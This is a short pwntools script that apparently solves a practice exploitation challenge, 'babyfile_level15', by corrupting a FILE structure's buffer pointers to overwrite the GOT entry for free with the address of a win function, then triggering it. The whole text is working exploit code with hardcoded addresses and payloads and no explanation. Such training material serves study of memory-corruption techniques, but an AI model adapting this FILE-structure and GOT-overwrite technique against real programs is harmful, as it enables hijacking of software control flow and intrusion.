from pwn import * 

p = process('./babyfile_level15')

s = '''
b * fwrite
b * challenge+1684
'''





# leaking win
p.sendline("open_file")


# writing rip

p.sendline("new_note 0 3")


p.sendline("write_fp")

free_entry_addr = 0x405018


offset_to_buf_base = 0x8 * 7
payload = b'\x00' * offset_to_buf_base
payload += p64(free_entry_addr)
payload += p64(free_entry_addr + 4)
payload += b'\x00' * (0x8 * 5)
payload += p64(0)
p.sendline(payload)

win = 0x4013b6

gdb.attach(p, s)
time.sleep(1)

p.sendline(b"read_file 0")
payload2 = p64(win)
p.sendline(payload2)


p.sendline("del_note 0")


p.interactive()
